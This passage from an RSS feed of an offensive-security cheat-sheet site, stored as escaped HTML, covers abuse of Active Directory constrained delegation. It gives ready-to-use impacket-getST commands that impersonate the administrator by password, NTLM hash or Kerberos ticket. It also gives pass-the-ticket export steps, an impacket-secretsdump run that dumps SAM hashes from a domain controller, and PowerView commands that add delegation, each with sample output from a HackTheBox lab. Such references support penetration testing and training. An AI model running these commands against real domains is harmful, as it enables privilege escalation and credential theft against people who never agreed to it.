Ticket&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$:Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.129.31.133 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;WWW/dc.intelligence.htb&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting TGT for user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$&amp;#39;&lt;/span&gt; -hashes :655fefd062c233e273bb9f0566384474 -dc-ip 10.129.31.133 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;WWW/dc.intelligence.htb&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting TGT for user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s dc.intelligence.htb &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$:Password123!&amp;#39;&lt;/span&gt; -k -dc-ip 10.129.31.133 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;WWW/dc.intelligence.htb&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting TGT for user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s dc.intelligence.htb &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$&amp;#39;&lt;/span&gt; -hashes :655fefd062c233e273bb9f0566384474 -k -dc-ip 10.129.31.133 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;WWW/dc.intelligence.htb&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting TGT for user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s dc.intelligence.htb &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$&amp;#39;&lt;/span&gt; -k -no-pass -dc-ip 10.129.31.133 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;WWW/dc.intelligence.htb&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating administrator&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3-secrets-dump&#34;&gt;3. Secrets Dump&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Pass-the-ticket&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;export KRB5CCNAME=&amp;#39;&amp;lt;CCACHE&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;export KRB5CCNAME=&amp;#39;administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;TARGET_USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -k -no-pass&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s dc.intelligence.htb &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-secretsdump &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/administrator@dc.intelligence.htb&amp;#39;&lt;/span&gt; -k -no-pass&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Service RemoteRegistry is in stopped state&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Starting service RemoteRegistry&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Target system bootKey: 0xcae14f646af6326ace0e1f5b8b4146df&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:0054cc2f7ff3b56d9e47eb39c89b521f:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;---[SNIP]---&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34;&gt;&lt;h4 id=&#34;1-add-delegation-optional&#34;&gt;1. Add Delegation [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Import PowerView&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;. .\PowerView.ps1&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount &amp;lt;USER&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-check&#34;&gt;2. Check&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Check msds-allowedtodelegateto&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Get-NetUser -TrustedToAuth&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;button data-tabset=&#34;set1-2&#34; data-tabcontent=&#34;tab1&#34; class=&#34;active&#34;&gt;Hash&lt;/button&gt;&#xA;&lt;button data-tabset=&#34;set1-2&#34; data-tabcontent=&#34;tab2&#34; &gt;Kerberos&lt;/button&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Constrained Delegation</title>
      <link>https://tldrbins.github.io/constrained_delegation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 